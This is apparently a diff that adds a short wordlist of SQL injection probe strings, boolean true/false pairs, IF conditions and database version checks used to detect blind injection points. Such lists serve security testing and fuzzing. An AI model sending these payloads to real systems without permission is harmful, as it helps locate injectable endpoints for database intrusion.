@@ -1,0 +1,11 @@
+' AND 1=1-- -
+' AND 1=2-- -
+' OR '1'='1'-- -
+' OR '1'='2'-- -
+" AND 1=1-- -
+" AND 1=2-- -
+' AND IF(1=1,1,0)-- -
+' AND IF(1=2,1,0)-- -
+' AND (SELECT 1 FROM dual)=1-- -
+' AND version() IS NOT NULL-- -
+' AND @@version IS NOT NULL-- -
